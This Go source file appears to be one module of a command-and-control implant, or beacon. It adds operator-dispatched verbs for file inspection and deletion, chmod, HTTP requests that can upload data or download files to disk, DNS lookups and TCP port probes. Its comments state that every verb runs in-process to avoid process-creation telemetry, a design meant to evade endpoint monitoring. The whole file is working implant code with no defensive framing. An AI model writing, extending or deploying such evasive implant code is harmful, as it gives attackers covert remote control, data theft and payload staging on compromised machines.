package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/md5"
	"crypto/sha1"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// Extra native verbs. All execute in-process — no subprocess, no argv,
// no process-creation telemetry. Platform-specific verbs (df, uptime)
// live in native_extra_linux.go / native_extra_windows.go.
//
// Output is capped at NATIVE_EXTRA_MAX_OUTPUT bytes. Larger results
// are truncated with a trailing marker so the operator can tell.

const nativeExtraMaxOutput = 1 * 1024 * 1024  // 1 MiB

// The complete list of verbs dispatched through this file. Keep in sync
// with console.py's NATIVE_EXTRA_VERBS.
var nativeExtraVerbs = map[string]bool{
	// Inspection
	"find":     true,
	"grep":     true,
	"head":     true,
	"tail":     true,
	"stat":     true,
	"strings":  true,
	"hexdump":  true,
	"sha1":     true,
	"md5":      true,
	"readlink": true,
	"realpath": true,
	"du":       true,
	// File ops
	"mkdir": true,
	"rm":    true,
	"cp":    true,
	"mv":    true,
	"chmod": true,
	// Network
	"curl":    true,
	"resolve": true,
	"nc":      true,
	// System
	"df":      true,
	"uptime":  true,
	"date":    true,
	"getpid":  true,
	"getppid": true,
}

// isNativeExtraVerb reports whether verb is handled by this file.
func isNativeExtraVerb(verb string) bool {
	return nativeExtraVerbs[verb]
}

// nativeExtraVerb dispatches a verb to its handler. On unknown verbs,
// returns an error result. Never spawns a child process.
func (a *Agent) nativeExtraVerb(ctx context.Context, t Task) Result {
	// curl is the one verb that needs the agent's HTTP client so the
	// request inherits the same TLS trust settings the beacon itself
	// uses. Every other verb is self-contained.
	var out string
	var err error
	if t.Verb == "curl" {
		out, err = nativeCurlWithClient(ctx, a.client, t.Args)
	} else {
		out, err = runNativeExtra(ctx, t.Verb, t.Args)
	}
	if err != nil {
		return Result{ID: t.ID, Error: err.Error()}
	}
	if len(out) > nativeExtraMaxOutput {
		// Truncate at a rune boundary so a multi-byte UTF-8 sequence
		// is not split in half.
		cut := nativeExtraMaxOutput
		for cut > 0 && (out[cut]&0xC0) == 0x80 {
			cut--
		}
		out = out[:cut] + "\n[output truncated at 1 MiB]\n"
	}
	return Result{ID: t.ID, Output: encodeOutput([]byte(out))}
}

// runNativeExtra is the single dispatcher. Every case below is fully
// in-process.
func runNativeExtra(ctx context.Context, verb string, args []string) (string, error) {
	switch verb {
	case "find":
		return nativeFind(args)
	case "grep":
		return nativeGrep(args)
	case "head":
		return nativeHeadTail(args, true)
	case "tail":
		return nativeHeadTail(args, false)
	case "stat":
		return nativeStat(args)
	case "strings":
		return nativeStrings(args)
	case "hexdump":
		return nativeHexdump(args)
	case "sha1":
		return nativeHash(args, "sha1")
	case "md5":
		return nativeHash(args, "md5")
	case "readlink":
		return nativeReadlink(args)
	case "realpath":
		return nativeRealpath(args)
	case "du":
		return nativeDU(args)
	case "mkdir":
		return nativeMkdir(args)
	case "rm":
		return nativeRm(args)
	case "cp":
		return nativeCp(args)
	case "mv":
		return nativeMv(args)
	case "chmod":
		return nativeChmod(args)
	case "curl":
		return nativeCurl(ctx, args)
	case "resolve":
		return nativeResolve(ctx, args)
	case "nc":
		return nativeNC(ctx, args)
	case "df":
		return nativeDF(args)
	case "uptime":
		return nativeUptime()
	case "date":
		return time.Now().Format(time.RFC3339) + "\n", nil
	case "getpid":
		return fmt.Sprintf("%d\n", os.Getpid()), nil
	case "getppid":
		return fmt.Sprintf("%d\n", os.Getppid()), nil
	}
	return "", errors.New("unknown native extra verb: " + verb)
}

// ---------------------------------------------------------------------------
// Inspection
// ---------------------------------------------------------------------------

// nativeFind walks a directory tree and prints paths matching a
// filepath.Match pattern. Pattern is matched against the basename.
// Caps results at 1000 entries.
//
// Usage: find <path> <pattern>
func nativeFind(args []string) (string, error) {
	if len(args) < 2 {
		return "", errors.New("usage: find <path> <pattern>")
	}
	root, pattern := args[0], args[1]

	var sb strings.Builder
	count := 0
	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return nil // skip unreadable entries
		}
		if count >= 1000 {
			return filepath.SkipAll
		}
		name := d.Name()
		if ok, _ := filepath.Match(pattern, name); ok {
			info, _ := d.Info()
			size := int64(0)
			if info != nil {
				size = info.Size()
			}
			kind := "f"
			if d.IsDir() {
				kind = "d"
			}
			fmt.Fprintf(&sb, "%s %10d %s\n", kind, size, path)
			count++
		}
		return nil
	})
	// filepath.SkipAll is a sentinel the walk function returns to stop
	// the walk early. WalkDir surfaces it as its own return error, so
	// the naive `if err != nil` check would turn a legitimate "hit the
	// cap" into a failure result.
	if err != nil && err != filepath.SkipAll {
		return sb.String(), err
	}
	fmt.Fprintf(&sb, "\n[%d match(es)]\n", count)
	return sb.String(), nil
}

// nativeGrep searches a file for lines containing a substring.
// Case-insensitive with -i. Caps at 1000 matching lines.
//
// Usage: grep [-i] <pattern> <file>
func nativeGrep(args []string) (string, error) {
	if len(args) < 2 {
		return "", errors.New("usage: grep [-i] <pattern> <file>")
	}
	insensitive := false
	if args[0] == "-i" {
		insensitive = true
		args = args[1:]
	}
	if len(args) < 2 {
		return "", errors.New("usage: grep [-i] <pattern> <file>")
	}
	pattern, path := args[0], args[1]
	if insensitive {
		pattern = strings.ToLower(pattern)
	}

	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()

	var sb strings.Builder
	scanner := bufio.NewScanner(f)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)
	lineNo := 0
	matches := 0
	for scanner.Scan() {
		lineNo++
		line := scanner.Text()
		hay := line
		if insensitive {
			hay = strings.ToLower(line)
		}
		if strings.Contains(hay, pattern) {
			fmt.Fprintf(&sb, "%d:%s\n", lineNo, line)
			matches++
			if matches >= 1000 {
				fmt.Fprintln(&sb, "[truncated at 1000 matches]")
				break
			}
		}
	}
	if err := scanner.Err(); err != nil {
		return sb.String(), err
	}
	fmt.Fprintf(&sb, "\n[%d match(es) in %d line(s)]\n", matches, lineNo)
	return sb.String(), nil
}

// nativeHeadTail prints first (head=true) or last N lines of a file.
// Default N=20. Reads whole file; rejects files over 10 MiB.
//
// Usage: head <file> [N]   |   tail <file> [N]
func nativeHeadTail(args []string, head bool) (string, error) {
	if len(args) < 1 {
		verb := "head"
		if !head {
			verb = "tail"
		}
		return "", errors.New("usage: " + verb + " <file> [N]")
	}
	path := args[0]
	n := 20
	if len(args) >= 2 {
		if v, err := strconv.Atoi(args[1]); err == nil && v > 0 {
			n = v
		}
	}

	fi, err := os.Stat(path)
	if err != nil {
		return "", err
	}
	if fi.Size() > 10*1024*1024 {
		return "", fmt.Errorf("file too large (%d bytes; cap 10 MiB)",
			fi.Size())
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	lines := strings.Split(string(data), "\n")
	// Trailing newline produces an empty trailing element — drop it.
	if len(lines) > 0 && lines[len(lines)-1] == "" {
		lines = lines[:len(lines)-1]
	}

	var sb strings.Builder
	if head {
		for i := 0; i < n && i < len(lines); i++ {
			sb.WriteString(lines[i])
			sb.WriteByte('\n')
		}
	} else {
		start := len(lines) - n
		if start < 0 {
			start = 0
		}
		for i := start; i < len(lines); i++ {
			sb.WriteString(lines[i])
			sb.WriteByte('\n')
		}
	}
	return sb.String(), nil
}

// nativeStat prints metadata for a path. Cross-platform fields plus a
// few POSIX fields on Unix.
//
// Usage: stat <path>
func nativeStat(args []string) (string, error) {
	if len(args) < 1 {
		return "", errors.New("usage: stat <path>")
	}
	fi, err := os.Lstat(args[0])
	if err != nil {
		return "", err
	}
	var sb strings.Builder
	fmt.Fprintf(&sb, "Path     : %s\n", args[0])
	fmt.Fprintf(&sb, "Name     : %s\n", fi.Name())
	fmt.Fprintf(&sb, "Size     : %d bytes\n", fi.Size())
	fmt.Fprintf(&sb, "Mode     : %s\n", fi.Mode())
	fmt.Fprintf(&sb, "ModTime  : %s\n", fi.ModTime().Format(time.RFC3339))
	if fi.IsDir() {
		fmt.Fprintln(&sb, "Type     : directory")
	} else if fi.Mode()&os.ModeSymlink != 0 {
		target, _ := os.Readlink(args[0])
		fmt.Fprintf(&sb, "Type     : symlink -> %s\n", target)
	} else {
		fmt.Fprintln(&sb, "Type     : regular file")
	}
	// POSIX extras; the platform helper appends uid/gid on Unix.
	sb.WriteString(nativeStatExtra(args[0]))
	return sb.String(), nil
}

// nativeStrings extracts printable ASCII sequences >= 4 chars from a
// file. Reads whole file; rejects files over 20 MiB.
//
// Usage: strings <file>
func nativeStrings(args []string) (string, error) {
	if len(args) < 1 {
		return "", errors.New("usage: strings <file>")
	}
	fi, err := os.Stat(args[0])
	if err != nil {
		return "", err
	}
	if fi.Size() > 20*1024*1024 {
		return "", fmt.Errorf("file too large (%d bytes; cap 20 MiB)",
			fi.Size())
	}
	data, err := os.ReadFile(args[0])
	if err != nil {
		return "", err
	}

	var sb strings.Builder
	var cur []byte
	flush := func() {
		if len(cur) >= 4 {
			sb.Write(cur)
			sb.WriteByte('\n')
		}
		cur = cur[:0]
	}
	for _, b := range data {
		if b >= 0x20 && b < 0x7f {
			cur = append(cur, b)
		} else {
			flush()
		}
	}
	flush()
	return sb.String(), nil
}

// nativeHexdump prints a classic hexdump -C style dump. Caps output at
// 1 MiB of source data.
//
// Usage: hexdump <file>
func nativeHexdump(args []string) (string, error) {
	if len(args) < 1 {
		return "", errors.New("usage: hexdump <file>")
	}
	f, err := os.Open(args[0])
	if err != nil {
		return "", err
	}
	defer f.Close()

	limit := int64(nativeExtraMaxOutput / 4) // rough cap
	data, readErr := io.ReadAll(io.LimitReader(f, limit))
	// The error is only interesting when it is not io.EOF. A partial
	// read is reported by the caller as a complete hexdump, so a
	// mid-read failure must surface as an error result.
	if readErr != nil && readErr != io.EOF {
		return "", readErr
	}

	var sb strings.Builder
	for off := 0; off < len(data); off += 16 {
		end := off + 16
		if end > len(data) {
			end = len(data)
		}
		chunk := data[off:end]

		// Offset
		fmt.Fprintf(&sb, "%08x  ", off)
		// Hex
		for i := 0; i < 16; i++ {
			if i < len(chunk) {
				fmt.Fprintf(&sb, "%02x ", chunk[i])
			} else {
				sb.WriteString("   ")
			}
			if i == 7 {
				sb.WriteByte(' ')
			}
		}
		sb.WriteString(" |")
		// ASCII
		for _, b := range chunk {
			if b >= 0x20 && b < 0x7f {
				sb.WriteByte(b)
			} else {
				sb.WriteByte('.')
			}
		}
		sb.WriteString("|\n")
	}
	if int64(len(data)) == limit {
		sb.WriteString("... [truncated]\n")
	}
	return sb.String(), nil
}

// nativeHash computes sha1 or md5 of a file, printing hex digest.
//
// Usage: sha1 <file>  |  md5 <file>
func nativeHash(args []string, kind string) (string, error) {
	if len(args) < 1 {
		return "", errors.New("usage: " + kind + " <file>")
	}
	f, err := os.Open(args[0])
	if err != nil {
		return "", err
	}
	defer f.Close()

	switch kind {
	case "sha1":
		h := sha1.New()
		if _, err := io.Copy(h, f); err != nil {
			return "", err
		}
		return hex.EncodeToString(h.Sum(nil)) + "  " + args[0] + "\n", nil
	case "md5":
		h := md5.New()
		if _, err := io.Copy(h, f); err != nil {
			return "", err
		}
		return hex.EncodeToString(h.Sum(nil)) + "  " + args[0] + "\n", nil
	}
	return "", errors.New("unknown hash: " + kind)
}

// nativeReadlink resolves a symlink.
//
// Usage: readlink <path>
func nativeReadlink(args []string) (string, error) {
	if len(args) < 1 {
		return "", errors.New("usage: readlink <path>")
	}
	target, err := os.Readlink(args[0])
	if err != nil {
		return "", err
	}
	return target + "\n", nil
}

// nativeRealpath returns the canonical absolute path, resolving
// symlinks.
//
// Usage: realpath <path>
func nativeRealpath(args []string) (string, error) {
	if len(args) < 1 {
		return "", errors.New("usage: realpath <path>")
	}
	abs, err := filepath.Abs(args[0])
	if err != nil {
		return "", err
	}
	// EvalSymlinks returns the input unchanged if the path does not
	// exist; that's still useful to the operator.
	if resolved, err := filepath.EvalSymlinks(abs); err == nil {
		return resolved + "\n", nil
	}
	return abs + "\n", nil
}

// nativeDU reports total size of a directory tree in bytes and files.
//
// Usage: du <path>
func nativeDU(args []string) (string, error) {
	if len(args) < 1 {
		return "", errors.New("usage: du <path>")
	}
	root := args[0]
	var total int64
	var files int

	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		if d.IsDir() {
			return nil
		}
		info, err := d.Info()
		if err != nil {
			return nil
		}
		total += info.Size()
		files++
		return nil
	})
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("%d bytes  %d files  %s\n", total, files, root), nil
}

// ---------------------------------------------------------------------------
// File operations
// ---------------------------------------------------------------------------

// nativeMkdir creates a directory tree.
//
// Usage: mkdir <path>
func nativeMkdir(args []string) (string, error) {
	if len(args) < 1 {
		return "", errors.New("usage: mkdir <path>")
	}
	if err := os.MkdirAll(args[0], 0700); err != nil {
		return "", err
	}
	return "created: " + args[0] + "\n", nil
}

// nativeRm removes a file or empty directory.
//
// Usage: rm <path>
func nativeRm(args []string) (string, error) {
	if len(args) < 1 {
		return "", errors.New("usage: rm <path>")
	}
	if err := os.Remove(args[0]); err != nil {
		return "", err
	}
	return "removed: " + args[0] + "\n", nil
}

// nativeCp copies a file.
//
// Usage: cp <src> <dst>
func nativeCp(args []string) (string, error) {
	if len(args) < 2 {
		return "", errors.New("usage: cp <src> <dst>")
	}
	srcInfo, err := os.Stat(args[0])
	if err != nil {
		return "", err
	}
	src, err := os.Open(args[0])
	if err != nil {
		return "", err
	}
	defer src.Close()

	// Preserve the source mode so a copied executable remains
	// executable. Fall back to 0600 if the source has no
	// permission bits set (unusual).
	mode := srcInfo.Mode().Perm()
	if mode == 0 {
		mode = 0600
	}
	dst, err := os.OpenFile(args[1],
		os.O_CREATE|os.O_WRONLY|os.O_TRUNC, mode)
	if err != nil {
		return "", err
	}
	defer dst.Close()

	n, err := io.Copy(dst, src)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("copied %d bytes\n", n), nil
}

// nativeMv renames (moves) a path. Works within the same filesystem.
//
// Usage: mv <src> <dst>
func nativeMv(args []string) (string, error) {
	if len(args) < 2 {
		return "", errors.New("usage: mv <src> <dst>")
	}
	if err := os.Rename(args[0], args[1]); err != nil {
		return "", err
	}
	return fmt.Sprintf("moved: %s -> %s\n", args[0], args[1]), nil
}

// nativeChmod changes a file mode. Mode is parsed as octal (e.g. 0644).
//
// Usage: chmod <mode> <path>
func nativeChmod(args []string) (string, error) {
	if len(args) < 2 {
		return "", errors.New("usage: chmod <octal-mode> <path>")
	}
	mode, err := strconv.ParseUint(args[0], 8, 32)
	if err != nil {
		return "", fmt.Errorf("invalid mode (expected octal like 0644): %v", err)
	}
	if err := os.Chmod(args[1], os.FileMode(mode)); err != nil {
		return "", err
	}
	return fmt.Sprintf("chmod %04o %s\n", mode, args[1]), nil
}

// ---------------------------------------------------------------------------
// Network (all in-process — no child curl, dig, or nc)
// ---------------------------------------------------------------------------

// nativeCurl performs an HTTP request in-process. No subprocess.
//
// Usage:
//   curl <url>
//   curl <url> --method POST --data 'key=value'
//   curl <url> -o <path>
//   curl <url> --header 'X-Foo: bar' --header 'X-Baz: qux'
// nativeCurlWithClient performs the request using the supplied client,
// which carries the agent's TLS configuration. This is what the
// dispatcher actually calls; nativeCurl is kept as a fallback that
// uses the default transport.
func nativeCurlWithClient(ctx context.Context, client *http.Client, args []string) (string, error) {
	return nativeCurlImpl(ctx, client, args)
}

func nativeCurl(ctx context.Context, args []string) (string, error) {
	return nativeCurlImpl(ctx, &http.Client{Timeout: 30 * time.Second}, args)
}

func nativeCurlImpl(ctx context.Context, client *http.Client, args []string) (string, error) {
	if len(args) < 1 {
		return "", errors.New("usage: curl <url> [--method M] [--data D] [-o F] [--header 'K: V']")
	}
	rawURL := args[0]
	if _, err := url.ParseRequestURI(rawURL); err != nil {
		return "", fmt.Errorf("invalid URL: %v", err)
	}

	method := "GET"
	var body string
	var outFile string
	var headers []string
	i := 1
	for i < len(args) {
		switch args[i] {
		case "--method", "-X":
			if i+1 >= len(args) {
				return "", errors.New("--method needs a value")
			}
			method = strings.ToUpper(args[i+1])
			i += 2
		case "--data", "-d":
			if i+1 >= len(args) {
				return "", errors.New("--data needs a value")
			}
			body = args[i+1]
			if method == "GET" {
				method = "POST"
			}
			i += 2
		case "-o", "--output":
			if i+1 >= len(args) {
				return "", errors.New("-o needs a value")
			}
			outFile = args[i+1]
			i += 2
		case "--header", "-H":
			if i+1 >= len(args) {
				return "", errors.New("--header needs a value")
			}
			headers = append(headers, args[i+1])
			i += 2
		default:
			return "", fmt.Errorf("unknown curl flag: %s", args[i])
		}
	}

	reqCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	var reqBody io.Reader
	if body != "" {
		reqBody = strings.NewReader(body)
	}
	req, err := http.NewRequestWithContext(reqCtx, method, rawURL, reqBody)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")
	for _, h := range headers {
		if k, v, ok := strings.Cut(h, ":"); ok {
			req.Header.Set(strings.TrimSpace(k),
				strings.TrimSpace(v))
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, nativeExtraMaxOutput))
	if err != nil {
		return "", err
	}

	if outFile != "" {
		if err := os.WriteFile(outFile, bodyBytes, 0600); err != nil {
			return "", err
		}
		return fmt.Sprintf("HTTP %d  %d bytes  -> %s\n",
			resp.StatusCode, len(bodyBytes), outFile), nil
	}

	var sb bytes.Buffer
	fmt.Fprintf(&sb, "HTTP %d\n", resp.StatusCode)
	for k, vv := range resp.Header {
		for _, v := range vv {
			fmt.Fprintf(&sb, "%s: %s\n", k, v)
		}
	}
	sb.WriteByte('\n')
	sb.Write(bodyBytes)
	sb.WriteByte('\n')
	return sb.String(), nil
}

// nativeResolve performs a DNS lookup in-process. Prints all A/AAAA
// records for the host.
//
// Usage: resolve <host>
func nativeResolve(ctx context.Context, args []string) (string, error) {
	if len(args) < 1 {
		return "", errors.New("usage: resolve <host>")
	}
	lookupCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	var sb strings.Builder
	addrs, err := net.DefaultResolver.LookupHost(lookupCtx, args[0])
	if err != nil {
		return "", err
	}
	fmt.Fprintf(&sb, "%s\n", args[0])
	for _, a := range addrs {
		// Determine v4/v6 by parsing.
		ip := net.ParseIP(a)
		kind := "A/AAAA"
		if ip != nil {
			if ip.To4() != nil {
				kind = "A"
			} else {
				kind = "AAAA"
			}
		}
		fmt.Fprintf(&sb, "  %-5s %s\n", kind, a)
	}
	return sb.String(), nil
}

// nativeNC tests TCP reachability to host:port. In-process; no nc
// child.
//
// Usage: nc <host> <port>
func nativeNC(ctx context.Context, args []string) (string, error) {
	if len(args) < 2 {
		return "", errors.New("usage: nc <host> <port>")
	}
	port := args[1]
	if _, err := strconv.Atoi(port); err != nil {
		return "", fmt.Errorf("invalid port: %s", port)
	}
	addr := net.JoinHostPort(args[0], port)

	dialCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()

	d := net.Dialer{}
	conn, err := d.DialContext(dialCtx, "tcp", addr)
	if err != nil {
		return fmt.Sprintf("%s  closed (%v)\n", addr, err), nil
	}
	defer conn.Close()
	return fmt.Sprintf("%s  open\n", addr), nil
}